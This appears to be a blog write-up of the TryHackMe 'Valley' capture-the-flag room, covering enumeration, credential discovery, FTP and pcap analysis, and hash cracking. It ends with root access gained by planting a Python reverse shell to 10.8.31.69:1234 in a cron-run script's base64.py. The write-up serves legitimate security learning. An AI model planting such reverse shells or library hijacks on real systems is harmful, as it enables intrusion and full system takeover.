---
title: "TryHackMe Valley Writeup"
datePublished: Mon Nov 27 2023 17:50:20 GMT+0000 (Coordinated Universal Time)
cuid: clph7fq02000109jofqev0k8m
slug: tryhackme-valley-writeup
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1701107122995/946947fa-9699-4ae5-ade0-6dad6d7f66c9.jpeg
tags: ctf, tryhackme, pathhijacking

---

### Introduction

The Room [Valle](https://tryhackme.com/room/valleype)y is one of TryHackMe's easy boxes. We need to find the user and the root flag to complete the room. In the description, it says: Boot the box and find a way in to escalate all the way to root!

### Initial Access

I grew tired of typing IPs in the terminal so this time I added the rooms IP to /etc/hosts as valley.thm. Then I started with an Nmap scan as usual.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700156259636/e234a3b7-47a4-4b6d-b41f-3b0ba39fc967.png align="center")

We have SSH on port 22 and a website on port 80. I checked the website, but nothing interesting to find here.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700156358279/ec161bdf-57cd-48dc-af31-910c6a4fa62d.png align="center")

The buttons led to a gallery and a pricing table. In the site's source and the inspector's view, there was nothing else to see. I quickly searched for the usual /robots, /robots.txt etc. but no luck here as well. I used gobuster to enumerate the website further.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700156618988/a0073f0f-2b1e-429e-824e-8ce3419859e4.png align="center")

The directory /server status was the only newcomer on the list. But Access was forbidden. I noticed that the pictures from the gallery were stored in /static. The first picture was stored in /static/1 the second in /static/2 etc.. I tried a couple of other combinations like /static/99, /static/01 etc., and out of pure luck /static/00 gave me a hit.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157280262/d8452532-8774-4984-9065-fdc4cf46f470.png align="center")

There I got another directory to try, which I did immediately. It leads to a login page

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157426241/4b64b450-9264-4a01-9846-74b2a1719557.png align="center")

This time I had no luck by trying the usual suspects like admin/admin. So I checked again the source of the site and gave it a closer look in the inspector. In the inspector, I found a suspicious dev.js file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157661261/7770b91e-6be8-499b-a33e-2e579cf13b32.png align="center")

In the dev.js file, I found the credentials to log in.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157728381/c791527d-8877-4289-8b3a-8033d7ad4ebd.png align="center")

Again I got some notes. The first one gave me the impression to try and reuse the found credentials, the last one made me do another Nmap scan for all possible ports.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157854221/f238e4d6-21f4-4720-92e3-8c51bb0ec3ba.png align="center")

There is one additional Port open with an unknown service. I'm expecting it to be the said ftp port. I tried the credentials found in the dev.js. and had access to the ftp server.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700157955520/c5eb61bf-4daf-45b1-8308-25599ddcd33a.png align="center")

I found three files, and all of them seemed to be packet captures. I downloaded them to my machine and inspected them further with Wireshark. After a couple of minutes, I found some credentials in the siemHTTTP2.pcap. I used them to log in via ssh.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1700158151434/d31217af-d17f-4cb3-bbb2-7b23d1bec3c1.png align="center")

Here I found the user flag.

### Privilege Escalation

In valleyDev's directory, I found a file valleyAuthenticator. It seems to be a compiled program but I couldn't start it. I checked if Python was available on the valleyDevs machine, and it was. So I opened a python simple HTTP server and downloaded the file to my machine for further inspection. I tried to decompile it with Ghidra, but wasn't able to get anything useful. I'm by no means an Expert in reverse engineering, it's something I need to address in the future. I spent some time trying to reverse-engineer the file, but after some time I gave up and looked at this [writeu](https://cyberiumx.com/write-ups/tryhackme-valley/)p. The author used a tool called upx. I followed CyberiumXs instructions and I was able to get two md5 hashes. I cracked them with an online Hash tool and got credentials for the user valley. I used them to log in via SSH.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1701105061483/d52fd7fa-28c5-43a4-a0a2-bfe174d9e4b7.png align="center")

### Getting Root

In valleys directory, there was nothing of interest to find. I checked for interesting crontabs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1701105175586/fdbd2a91-a5cc-4dcb-a0c3-a337de43d44f.png align="center")

I found a Python program that ran as root. I opened it and immediately noticed the base64 import. This meant I could possible use a technique called Path Hijacking.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1701106030534/4fb14814-4466-40d3-9ee9-9c5d835503e1.png align="center")

I located the base64.py file.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1701106125361/13873a13-cb4b-41d0-a844-ef99f0ac9df2.png align="center")

And opened it in Nano to edit it. So I can sneak in a reverse shell. I used this reverse shell in the b64encode() function of the base64.py file.

```python
import sys
import socket
import os
import pty
s=socket.socket()
s.connect(("10.8.31.69", 1234))
[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

While I waited for the cronjob to run, I set up a Netcat listener on port 1234.

```bash
nc -lvnp 1234
```

After the cronjob ran I got a reverse shell as root and was able to retrieve the root flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1701106791389/26ecccc8-0ee7-4eff-abee-325875190692.png align="center")

And the room was completed.